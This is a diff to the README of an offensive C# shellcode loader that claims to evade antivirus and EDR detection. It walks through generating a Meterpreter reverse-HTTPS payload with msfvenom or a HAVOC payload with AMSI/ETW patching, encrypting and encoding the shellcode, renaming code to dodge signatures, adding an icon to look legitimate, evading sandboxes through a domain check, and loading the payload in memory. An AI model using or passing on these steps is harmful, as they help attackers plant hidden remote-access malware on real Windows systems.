@@ -19,8 +19,9 @@ Shellcode loader (written in C#) that implements several antivirus bypass and de
   - STEP 1. Generate a Csharp shellcode with your favorite C2 framework or generate a "raw" shellcode and then convert it to the Csharp format.
 ```
 Examples
+--------
 [*] METASPLOIT C2 Framework 
-    $ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/path/cert.pem LHOST=IP LPORT=port -a x64 -f csharp -o stageless-shellcode.bin
+    $ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/path/cert.pem LHOST=IP LPORT=port -a x64 -f csharp -o csharp_stageless-shellcode
 
 [*] HAVOC C2 Framework 
     Generate a new HAVOC payload with the format "Windows Shellcode" (Arch: x64; Indirect Syscall enabled; no sleep obfuscation; amsi/etw patching technique: hardware breakpoints)
@@ -31,14 +32,13 @@ Examples
    > Or use a tool like "SUPERNOVA" to convert it (SuperNova is a shellcode encryptor & obfuscator tool - https://github.com/nickvourd/Supernova)
 ``` 
 
-  - STEP 2. Encrypt the shellcode using AES-256 encryption in CBC mode, then Base64-encode the encrypted output and save it to a file.
+  - STEP 2.  Use the tool "Shellcode-Crypter-and-Encoder.exe" to encrypt your shellcode using AES-256, then encode the encrypted output in Base64 format and save the result to a file.
  ```
-Examples
-[*] AES encryption code - https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab4/3.cs
-[*] Base64 encoding
-    byte[] EncryptedShellcodeBytes = { ... };
-    string Base64EncodedData = Convert.ToBase64String(EncryptedShellcodeBytes);
-    Console.WriteLine(Base64EncodedData);
+C:\Temp> Shellcode-Crypter-and-Encoder.exe
+[*] Usage:
+    > Shellcode-Crypter-and-Encoder.exe <path_to_C#_shellcode_file> <AES key>
+[*] Example:
+    > Shellcode-Crypter-and-Encoder.exe Csharp_shellcode.txt SuperAesKey > Encrypted_and_bas64encoded_shellcode.txt
 ```
   - STEP 3. OPSEC requirements - Manually obfuscate the C# shellcode loader file
   	- Rename the namespace, classes, methods, and variables.
@@ -51,16 +51,18 @@ Examples
     <i/> Note: Adding an icon file and assembly attributes can make your executable appear more legitimate. </i>
 ```  
 [*] Example with "Developer PowerShell for VS 2022" - Microsoft (R) Visual C# Compiler
-    Command: csc /t:exe /out:C:\path\Loader.exe C:\path\CsharpShellCodeLoader.cs AssemblyInfo.cs -nowarn:1691,618  -win32icon:.\icon.ico
+    > csc /t:exe /out:C:\path\Loader.exe C:\path\CsharpShellCodeLoader.cs AssemblyInfo.cs -nowarn:1691,618  -win32icon:.\icon.ico
 ``` 
   - STEP 5. Optional Actions
   	- You may compress and obfuscate the shellcode loader executable using a packer such as ConfuserEx. However, this step is not strictly necessary to bypass most AV solutions if you performed sufficient manual obfuscation in Step 3.
   	- Alternatively, you may choose to remotely download and execute the C# binary in memory using PowerShell and reflection-based code loading. This approach avoids writing the binary to disk, enhancing stealth and reducing forensic traces.
   - STEP 6. Execution
 ```
-[*] Command: loader.exe <domain name> <C:\filepath\base64-shellcode-file.txt> <AES key>
-[*] Command: loader.exe lab.local C:\temp\base64-shellcode.txt superkey
-    Note:
+[*] Usage :
+    > loader.exe <domain name> <C:\filepath\Encrypted_and_bas64encoded_shellcode.txt> <AES key>
+[*] Example:
+    > loader.exe lab.local C:\temp\Encrypted_and_bas64encoded_shellcode.txt SuperAesKey
+[*] Note:
     > Argument 1 = The domain name of the target Windows machine. Used for sandbox detection/evasion by verifying domain membership.
     > Argument 2 = The file path to the AES-256 encrypted shellcode, which must be Base64-encoded (i.e., C:\path\file.txt or .\path\file.txt).
     > Argument 3 = The AES passkey used for encryption and decryption.
